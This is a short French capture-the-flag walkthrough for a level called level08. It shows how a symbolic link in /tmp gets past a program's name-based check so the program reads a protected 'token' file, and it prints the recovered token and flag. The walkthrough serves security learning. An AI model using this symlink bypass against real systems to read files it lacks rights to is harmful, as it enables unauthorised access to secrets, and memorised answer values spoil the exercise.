1. `token` semble etre le flag mais on a pas les droits
2. `./level08` a les droits pour le lire mais une securite nous empeche de lire un fichier nomme `token`
3. Procede
   ```
   mkdir /tmp/sandbox
   cd /tmp/sandbox
   ln -s ~/token fakeshit
   cd ~
   ./level08 /tmp/sandbox/fakeshit
   ```
4. token=quif5eloekouj29ke0vouxean

> Flag: 25749xKZ8L7DkSCwJkT9dyv6f